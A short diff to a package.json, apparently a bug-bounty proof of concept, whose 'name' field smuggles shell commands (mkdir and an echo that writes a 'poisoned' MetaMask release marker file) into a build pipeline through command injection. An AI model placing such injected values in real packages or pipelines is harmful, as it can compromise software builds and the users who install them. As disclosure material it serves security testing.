@@ -1,5 +1,5 @@
 {
-  "name": "h1-poc; echo \"--- H1-VERIFICATION-LOG-BY-ANOMALY-ZERO ---\"; #",
+  "name": "h1-poc; mkdir -p packages/h1-poc-verify/dist; echo 'OFFICIAL METAMASK RELEASE - POISONED BY ANOMALY' > packages/h1-poc-verify/dist/poison.txt; #",
   "private": true,
   "version": "1.0.0"
 }
